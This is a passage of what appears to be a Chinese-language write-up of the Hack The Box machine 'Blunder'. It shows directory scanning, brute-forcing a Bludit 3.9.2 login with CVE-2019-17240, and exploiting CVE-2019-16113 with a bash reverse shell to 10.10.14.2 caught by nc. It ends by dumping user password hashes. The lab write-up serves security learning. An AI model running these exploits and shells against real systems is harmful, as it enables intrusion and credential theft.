/.github/<br>[14:19:36] 200 -  563B  - /.gitignore<br>[14:19:36] 404 -  274B  - /.gitignore/<br>[14:19:37] 403 -  277B  - /.ht_wsr.txt<br>[14:19:37] 403 -  277B  - /.htaccess.bak1<br>[14:19:37] 403 -  277B  - /.htaccess.orig<br>[14:19:37] 403 -  277B  - /.htaccess.sample<br>[14:19:37] 403 -  277B  - /.htaccess.save<br>[14:19:37] 403 -  277B  - /.htaccess_orig<br>[14:19:37] 403 -  277B  - /.htaccess_sc<br>[14:19:38] 403 -  277B  - /.htaccessOLD2<br>[14:19:38] 403 -  277B  - /.htm<br>[14:19:37] 403 -  277B  - /.htaccess_extra<br>[14:19:38] 403 -  277B  - /.htaccessBAK<br>[14:19:38] 403 -  277B  - /.htaccessOLD<br>[14:19:38] 403 -  277B  - /.httr-oauth<br>[14:19:38] 403 -  277B  - /.htpasswds<br>[14:19:38] 403 -  277B  - /.htpasswd_test<br>[14:19:38] 403 -  277B  - /.html<br>[14:19:44] 403 -  277B  - /.php<br>[14:19:44] 403 -  277B  - /.php3<br>[14:19:56] 200 -    3KB - /about<br>[14:20:01] 301 -    0B  - /admin  -&gt;  http://10.10.10.191/admin/<br>[14:20:02] 200 -    2KB - /admin/.config<br>[14:20:02] 200 -    2KB - /admin/_logs/error-log<br>[14:20:02] 200 -    2KB - /admin/.htaccess<br>[14:20:02] 200 -    2KB - /admin/_logs/access.log<br>[14:20:02] 200 -    2KB - /admin/access.log<br>[14:20:03] 200 -    2KB - /admin/_logs/login.txt<br>[14:20:03] 200 -    2KB - /admin/_logs/error_log<br>[14:20:03] 200 -    2KB - /admin/<br>[14:20:03] 200 -    2KB - /admin/account.aspx<br>[14:20:03] 200 -    2KB - /admin/_logs/access-log<br>[14:20:03] 200 -    2KB - /admin/account<br>[14:20:03] 200 -    2KB - /admin/account.jsp<br>[14:20:02] 200 -    2KB - /admin/_logs/error.log<br>[14:20:02] 200 -    2KB - /admin/access.txt<br>[14:20:03] 200 -    2KB - /admin/admin-login<br>[14:20:03] 200 -    2KB - /admin/access_log<br>[14:20:03] 200 -    2KB - /admin/account.js<br>[14:20:02] 200 -    2KB - /admin/%3bindex/<br>[14:20:03] 200 -    2KB - /admin/admin-login.js<br>[14:20:03] 200 -    2KB - /admin/admin-login.html<br>[14:20:03] 200 -    2KB - /admin/admin<br>[14:20:03] 200 -    2KB - /admin/admin.aspx<br>[14:20:03] 200 -    2KB - /admin/admin.php<br>[14:20:03] 200 -    2KB - /admin/account.html<br>[14:20:03] 200 -    2KB - /admin/admin-login.aspx<br>[14:20:04] 200 -    2KB - /admin/admin_login<br>[14:20:04] 200 -    2KB - /admin/admin_login.aspx<br>[14:20:03] 200 -    2KB - /admin/_logs/access_log<br>[14:20:04] 200 -    2KB - /admin/admin_login.html<br>[14:20:03] 200 -    2KB - /admin/account.php<br>[14:20:04] 200 -    2KB - /admin/adminLogin.jsp<br>[14:20:04] 200 -    2KB - /admin/admin_login.js<br>[14:20:02] 200 -    2KB - /admin/_logs/err.log<br>[14:20:04] 200 -    2KB - /admin/adminLogin<br>[14:20:04] 200 -    2KB - /admin/adminLogin.aspx<br>[14:20:04] 200 -    2KB - /admin/admin_login.jsp<br>[14:20:03] 200 -    2KB - /admin/admin-login.php<br>[14:20:04] 200 -    2KB - /admin/backup/<br>[14:20:03] 200 -    2KB - /admin/admin-login.jsp<br>[14:20:04] 200 -    2KB - /admin/backups/<br>[14:20:04] 200 -    2KB - /admin/adminLogin.js<br>[14:20:04] 200 -    2KB - /admin/admin_login.php<br>[14:20:04] 200 -    2KB - /admin/adminLogin.php<br>[14:20:03] 200 -    2KB - /admin/admin.js<br>[14:20:04] 200 -    2KB - /admin/controlpanel<br>[14:20:04] 200 -    2KB - /admin/controlpanel.php<br>[14:20:04] 200 -    2KB - /admin/controlpanel.html<br>[14:20:04] 200 -    2KB - /admin/adminLogin.html<br>[14:20:04] 200 -    2KB - /admin/config.php<br>[14:20:05] 200 -    2KB - /admin/controlpanel.js<br>[14:20:03] 200 -    2KB - /admin/admin.html<br>[14:20:05] 200 -    2KB - /admin/cp.aspx<br>[14:20:03] 200 -    2KB - /admin/admin.jsp<br>[14:20:05] 200 -    2KB - /admin/cp.html<br>[14:20:05] 200 -    2KB - /admin/cp.jsp<br>[14:20:05] 200 -    2KB - /admin/db/<br>[14:20:05] 200 -    2KB - /admin/data/autosuggest<br>[14:20:04] 200 -    2KB - /admin/controlpanel.jsp<br>[14:20:05] 200 -    2KB - /admin/default<br>[14:20:04] 200 -    2KB - /admin/adminer.php<br>[14:20:05] 200 -    2KB - /admin/default.asp<br>[14:20:05] 200 -    2KB - /admin/cp.php<br>[14:20:05] 200 -    2KB - /admin/download.php<br>[14:20:05] 200 -    2KB - /admin/errors.log<br>[14:20:05] 200 -    2KB - /admin/error.txt<br>[14:20:05] 200 -    2KB - /admin/default/admin.asp<br>[14:20:05] 200 -    2KB - /admin/error.log<br>[14:20:05] 200 -    2KB - /admin/error_log<br>[14:20:04] 200 -    2KB - /admin/admin/login<br>[14:20:05] 200 -    2KB - /admin/cp.js<br>[14:20:05] 200 -    2KB - /admin/default/login.asp<br>[14:20:05] 200 -    2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp<br>[14:20:05] 200 -    2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php<br>[14:20:05] 200 -    2KB - /admin/export.php<br>[14:20:05] 200 -    2KB - /admin/FCKeditor<br>[14:20:05] 200 -    2KB - /admin/dumper/<br>[14:20:06] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp<br>[14:20:05] 200 -    2KB - /admin/cp<br>[14:20:06] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx<br>[14:20:06] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/php/upload.php<br>[14:20:04] 200 -    2KB - /admin/controlpanel.aspx<br>[14:20:06] 200 -    2KB - /admin/fckeditor/editor/filemanager/upload/asp/upload.asp<br>[14:20:06] 200 -    2KB - /admin/fckeditor/editor/filemanager/upload/php/upload.php<br>[14:20:06] 200 -    2KB - /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx<br>[14:20:06] 200 -    2KB - /admin/file.php<br>[14:20:06] 200 -    2KB - /admin/files.php<br>[14:20:06] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/php/connector.php<br>[14:20:05] 200 -    2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx<br>[14:20:05] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp<br>[14:20:06] 200 -    2KB - /admin/home.php<br>[14:20:06] 200 -    2KB - /admin/home.aspx<br>[14:20:06] 200 -    2KB - /admin/includes/configure.php~<br>[14:20:06] 200 -    2KB - /admin/home.js<br>[14:20:06] 200 -    2KB - /admin/heapdump<br>[14:20:06] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx<br>[14:20:06] 200 -    2KB - /admin/home.jsp<br>[14:20:07] 200 -    2KB - /admin/index.php<br>[14:20:07] 200 -    2KB - /admin/index.html<br>[14:20:06] 200 -    2KB - /admin/home<br>[14:20:07] 200 -    2KB - /admin/js/tiny_mce/<br>[14:20:06] 200 -    2KB - /admin/index<br>[14:20:07] 200 -    2KB - /admin/index.jsp<br>[14:20:06] 200 -    2KB - /admin/home.html<br>[14:20:07] 200 -    2KB - /admin/login<br>[14:20:07] 200 -    2KB - /admin/index.js<br>[14:20:07] 200 -    2KB - /admin/log/error.log<br>[14:20:07] 200 -    2KB - /admin/js/tiny_mce<br>[14:20:07] 200 -    2KB - /admin/login.asp<br>[14:20:07] 200 -    2KB - /admin/js/tinymce/<br>[14:20:07] 200 -    2KB - /admin/login.do<br>[14:20:07] 200 -    2KB - /admin/log<br>[14:20:07] 200 -    2KB - /admin/login.htm<br>[14:20:07] 200 -    2KB - /admin/login.aspx<br>[14:20:07] 200 -    2KB - /admin/login.py<br>[14:20:07] 200 -    2KB - /admin/login.rb<br>[14:20:07] 200 -    2KB - /admin/login.jsp<br>[14:20:07] 200 -    2KB - /admin/login.js<br>[14:20:07] 200 -    2KB - /admin/logon.php<br>[14:20:07] 200 -    2KB - /admin/logon.aspx<br>[14:20:08] 200 -    2KB - /admin/logon.jsp<br>[14:20:08] 200 -    2KB - /admin/logon.html<br>[14:20:07] 200 -    2KB - /admin/logon<br>[14:20:08] 200 -    2KB - /admin/logon.js<br>[14:20:08] 200 -    2KB - /admin/logs/<br>[14:20:08] 200 -    2KB - /admin/logs/access.log<br>[14:20:08] 200 -    2KB - /admin/logs/access_log<br>[14:20:07] 200 -    2KB - /admin/login.php<br>[14:20:07] 200 -    2KB - /admin/login.html<br>[14:20:08] 200 -    2KB - /admin/logs/err.log<br>[14:20:07] 200 -    2KB - /admin/index.aspx<br>[14:20:07] 200 -    2KB - /admin/js/tinymce<br>[14:20:08] 200 -    2KB - /admin/logs/access-log<br>[14:20:08] 200 -    2KB - /admin/logs/errors.log<br>[14:20:08] 200 -    2KB - /admin/logs/error_log<br>[14:20:08] 200 -    2KB - /admin/manage<br>[14:20:08] 200 -    2KB - /admin/manage.asp<br>[14:20:08] 200 -    2KB - /admin/logs/error-log<br>[14:20:08] 200 -    2KB - /admin/manage/admin.asp<br>[14:20:08] 200 -    2KB - /admin/mysql/<br>[14:20:08] 200 -    2KB - /admin/manage/login.asp<br>[14:20:08] 200 -    2KB - /admin/mysql2/index.php<br>[14:20:08] 200 -    2KB - /admin/logs/error.log<br>[14:20:08] 200 -    2KB - /admin/logs/login.txt<br>[14:20:09] 200 -    2KB - /admin/phpMyAdmin/<br>[14:20:09] 200 -    2KB - /admin/phpmyadmin/<br>[14:20:09] 200 -    2KB - /admin/phpmyadmin2/index.php<br>[14:20:09] 200 -    2KB - /admin/phpMyAdmin/index.php<br>[14:20:09] 200 -    2KB - /admin/phpmyadmin/index.php<br>[14:20:08] 200 -    2KB - /admin/mysql/index.php<br>[14:20:09] 200 -    2KB - /admin/phpMyAdmin<br>[14:20:09] 200 -    2KB - /admin/PMA/index.php<br>[14:20:09] 200 -    2KB - /admin/pMA/<br>[14:20:09] 200 -    2KB - /admin/pma/index.php<br>[14:20:09] 200 -    2KB - /admin/portalcollect.php?f=http://xxx&amp;t=js<br>[14:20:09] 200 -    2KB - /admin/release<br>[14:20:09] 200 -    2KB - /admin/pma/<br>[14:20:09] 200 -    2KB - /admin/private/logs<br>[14:20:09] 200 -    2KB - /admin/scripts/fckeditor<br>[14:20:09] 200 -    2KB - /admin/sqladmin/<br>[14:20:09] 200 -    2KB - /admin/secure/logon.jsp<br>[14:20:10] 200 -    2KB - /admin/sysadmin/<br>[14:20:10] 200 -    2KB - /admin/tiny_mce<br>[14:20:10] 200 -    2KB - /admin/uploads.php<br>[14:20:09] 200 -    2KB - /admin/signin<br>[14:20:10] 200 -    2KB - /admin/user_count.txt<br>[14:20:10] 200 -    2KB - /admin/web/<br>[14:20:10] 200 -    2KB - /admin/views/ajax/autocomplete/user/a<br>[14:20:09] 200 -    2KB - /admin/sxd/<br>[14:20:10] 200 -    2KB - /admin/tinymce<br>[14:20:09] 200 -    2KB - /admin/pol_log.txt<br>[14:20:10] 200 -    2KB - /admin/upload.php<br>[14:21:04] 200 -   30B  - /install.php<br>[14:21:04] 200 -   30B  - /install.php?profile=default<br>[14:21:09] 200 -    1KB - /LICENSE<br>[14:21:34] 200 -    3KB - /README.md<br>[14:21:41] 200 -   22B  - /robots.txt<br>[14:21:43] 403 -  277B  - /server-status<br>[14:21:43] 403 -  277B  - /server-status/<br>[14:21:58] 200 -  118B  - /todo.txt<br><br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p>6、至此扫描工作差不多了，开始查看下获取到的信息</p>
+<p>7、首页是一个cms的网站信息</p>
+<p><img src="http://sh1yan.top/photo/Blunder-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、后台管理页面显示这是一个 bludit 的管理后台</p>
+<p><img src="http://sh1yan.top/photo/Blunder-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、在这个管理后台的页面源码中，发现了当前的版本号信息</p>
+<p><img src="http://sh1yan.top/photo/Blunder-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>10、通过目录扫描发现的 todo.txt 文件，疑似发现了一个用户ID的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ curl http://10.10.10.191/todo.txt                 <br>-Update the CMS<br>-Turn off FTP - DONE<br>-Remove old <span class="hljs-built_in">users</span> - DONE<br>-Inform fergus that the new blog needs images - PENDING<br></code></pre></td></tr></table></figure>
+
+<p>11、至此，我们获取到了2个信息，疑似用户名ID：fergus；当前网站CMS版本号及名称：Bludit CMS  3.9.2</p>
+<p>12、使用 searchsploit 搜索相关漏洞信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ searchsploit Bludit 3.9.2     <br>------------------------------------------------------- ---------------------------------<br> Exploit Title                                         |  Path<br>------------------------------------------------------- ---------------------------------<br>Bludit  3.9.2 - Authentication Bruteforce Mitigation B | php/webapps/48746.rb<br>Bludit 3.9.2 - Auth Bruteforce Bypass                  | php/webapps/48942.py<br>Bludit 3.9.2 - Authentication Bruteforce Bypass (Metas | php/webapps/49037.rb<br>Bludit 3.9.2 - Directory Traversal                     | multiple/webapps/48701.txt<br>Bludit &lt; 3.13.1 Backup Plugin - Arbitrary File Downloa | php/webapps/51541.py<br>------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>
+
+<p>13、这里发现了一个  Auth Bruteforce Bypass 漏洞，可以用来爆破用户密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ searchsploit -m php/webapps/48942.py <br>  Exploit: Bludit 3.9.2 - Auth Bruteforce Bypass<br>      URL: https://www.exploit-db.com/exploits/48942<br>     Path: /usr/share/exploitdb/exploits/php/webapps/48942.py<br>    Codes: CVE-2019-17240<br> Verified: True<br>File Type: Python script, ASCII text executable<br>Copied to: /home/kali/桌面/48942.py<br></code></pre></td></tr></table></figure>
+
+<p>14、由于使用常规字典并不能成功爆破出账号密码，所以需要使用 cewl 工具，根据目标网站信息生成一套字典进行破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ cewl 10.10.10.191 &gt; wordlist.txt<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> fergus &gt; user.txt<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 48942.py -l http://10.10.10.191/admin/login.php -u user.txt -p wordlist.txt<br>[*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX <br>[.] Brute Force: Testing -&gt; fergus:via<br>[▃] Brute Force: Testing -&gt; fergus:him<br>[◓] Brute Force: Testing -&gt; fergus:Distinguished<br>[◤] Brute Force: Testing -&gt; fergus:Contribution<br>[┬] Brute Force: Testing -&gt; fergus:Letters<br>[←] Brute Force: Testing -&gt; fergus:probably<br>[▅] Brute Force: Testing -&gt; fergus:best<br>[◤] Brute Force: Testing -&gt; fergus:fictional<br>[o] Brute Force: Testing -&gt; fergus:character<br>[█] Brute Force: Testing -&gt; fergus:RolandDeschain<br><br>[*] SUCCESS !!<br>[+] Use Credential -&gt; fergus:RolandDeschain<br></code></pre></td></tr></table></figure>
+
+<p>15、到这里成功爆破出了用户的密码： fergus:RolandDeschain</p>
+<p>16、但是这些信息，并不足已让我们更加层次的获取一些权限，使用谷歌进行搜索RCE漏洞 <code>Bludit 3.9.2 RCE</code></p>
+<p><img src="http://sh1yan.top/photo/Blunder-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>17、发现了一个 CVE-2019-16113 编号的漏洞，进行尝试使用</p>
+<p><code>https://github.com/hg8/CVE-2019-16113-PoC</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改配置信息</span><br><br>url = <span class="hljs-string">&quot;http://10.10.10.191&quot;</span><br>user = <span class="hljs-string">&quot;fergus&quot;</span><br>password = <span class="hljs-string">&quot;RolandDeschain&quot;</span><br>cmd = <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.2/443 0&gt;&amp;1&#x27;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>18、发现可以利用，成功获取到一个初始下的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 CVE-2019-16113.py<br>[+] Loggin successful.<br>[+] Token CSRF: 024f87d5d005111e913a8a8f9b84d4084e1b53f3<br>[+] Shell upload succesful.<br>[+] .htaccess upload succesful.<br>[+] Command Execution Successful.<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.2] from (UNKNOWN) [10.10.10.191] 41598<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1257): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$<br></code></pre></td></tr></table></figure>
+
+<p>19、通过初步的信息探测，我们可能需要 hugo 用户下的权限，才能查看到第一个用户flag信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ <span class="hljs-built_in">ls</span> -la /home/<br><span class="hljs-built_in">ls</span> -la /home/<br>total 16<br>drwxr-xr-x  4 root  root  4096 Apr 27  2020 .<br>drwxr-xr-x 21 root  root  4096 Jul  6  2021 ..<br>drwxr-xr-x 16 hugo  hugo  4096 May 26  2020 hugo<br>drwxr-xr-x 16 shaun shaun 4096 Jul  6  2021 shaun<br>www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ <span class="hljs-built_in">ls</span> -la /home/hugo<br><span class="hljs-built_in">ls</span> -la /home/hugo<br>total 80<br>drwxr-xr-x 16 hugo hugo 4096 May 26  2020 .<br>drwxr-xr-x  4 root root 4096 Apr 27  2020 ..<br>lrwxrwxrwx  1 root root    9 Apr 28  2020 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 hugo hugo  220 Nov 28  2019 .bash_logout<br>-rw-r--r--  1 hugo hugo 3771 Nov 28  2019 .bashrc<br>drwx------ 13 hugo hugo 4096 Apr 27  2020 .cache<br>drwx------ 11 hugo hugo 4096 Nov 28  2019 .config<br>drwx------  3 hugo hugo 4096 Apr 27  2020 .gnupg<br>drwxrwxr-x  3 hugo hugo 4096 Nov 28  2019 .<span class="hljs-built_in">local</span><br>drwx------  5 hugo hugo 4096 Apr 27  2020 .mozilla<br>-rw-r--r--  1 hugo hugo  807 Nov 28  2019 .profile<br>drwx------  2 hugo hugo 4096 Apr 27  2020 .ssh<br>drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Desktop<br>drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Documents<br>drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Downloads<br>drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Music<br>drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Pictures<br>drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Public<br>drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Templates<br>drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Videos<br>-r--------  1 hugo hugo   33 Dec 22 14:38 user.txt<br>www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ <span class="hljs-built_in">cat</span> /home/hugo/user.txt<br>&lt;ludit-3.9.2/bl-content/tmp$ <span class="hljs-built_in">cat</span> /home/hugo/user.txt   <br><span class="hljs-built_in">cat</span>: /home/hugo/user.txt: Permission denied<br>www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$<br></code></pre></td></tr></table></figure>
+
+<p>20、通过在当前网站目录下不断信息枚举，收集到一些涉及admin或者一些密码的信息，但是并没有成果的破解成功，且这些密码并没有带来什么有价值的进展</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ <span class="hljs-built_in">cd</span> ../<br><span class="hljs-built_in">cd</span> ../<br>www-data@blunder:/var/www/bludit-3.9.2/bl-content$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>databases<br>pages<br>tmp<br>uploads<br>workspaces<br>www-data@blunder:/var/www/bludit-3.9.2/bl-content$ <span class="hljs-built_in">cd</span> databases<br><span class="hljs-built_in">cd</span> databases<br>www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>categories.php<br>pages.php<br>plugins<br>security.php<br>site.php<br>syslog.php<br>tags.php<br>users.php<br>www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ <span class="hljs-built_in">cat</span> users.php<br><span class="hljs-built_in">cat</span> users.php<br>&lt;?php defined(<span class="hljs-string">&#x27;BLUDIT&#x27;</span>) or die(<span class="hljs-string">&#x27;Bludit CMS.&#x27;</span>); ?&gt;<br>&#123;<br>    <span class="hljs-string">&quot;admin&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;nickname&quot;</span>: <span class="hljs-string">&quot;Admin&quot;</span>,<br>        <span class="hljs-string">&quot;firstName&quot;</span>: <span class="hljs-string">&quot;Administrator&quot;</span>,<br>        <span class="hljs-string">&quot;lastName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;bfcc887f62e36ea019e3295aafb8a3885966e265&quot;</span>,<br>        <span class="hljs-string">&quot;salt&quot;</span>: <span class="hljs-string">&quot;5dde2887e7aca&quot;</span>,<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;registered&quot;</span>: <span class="hljs-string">&quot;2019-11-27 07:40:55&quot;</span>,<br>        <span class="hljs-string">&quot;tokenRemember&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;tokenAuth&quot;</span>: <span class="hljs-string">&quot;b380cb62057e9da47afce66b4615107d&quot;</span>,<br>        <span class="hljs-string">&quot;tokenAuthTTL&quot;</span>: <span class="hljs-string">&quot;2009-03-15 14:00&quot;</span>,<br>        <span class="hljs-string">&quot;twitter&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;facebook&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;instagram&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;codepen&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;linkedin&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;github&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;gitlab&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;fergus&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;firstName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;lastName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;nickname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;author&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7&quot;</span>,<br>        <span class="hljs-string">&quot;salt&quot;</span>: <span class="hljs-string">&quot;jqxpjfnv&quot;</span>,<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;registered&quot;</span>: <span class="hljs-string">&quot;2019-11-27 13:26:44&quot;</span>,<br>        <span class="hljs-string">&quot;tokenRemember&quot;</span>: <span class="hljs-string">&quot;7192381e28f6bd412abe3d92a0c9144b&quot;</span>,<br>        <span class="hljs-string">&quot;tokenAuth&quot;</span>: <span class="hljs-string">&quot;0e8011811356c0c5bd2211cba8c50471&quot;</span>,<br>        <span class="hljs-string">&quot;tokenAuthTTL&quot;</span>: <span class="hljs-string">&quot;2009-03-15 14:00&quot;</span>,<br>        <span class="hljs-string">&quot;twitter&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;facebook&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;codepen&quot;</span>: <span 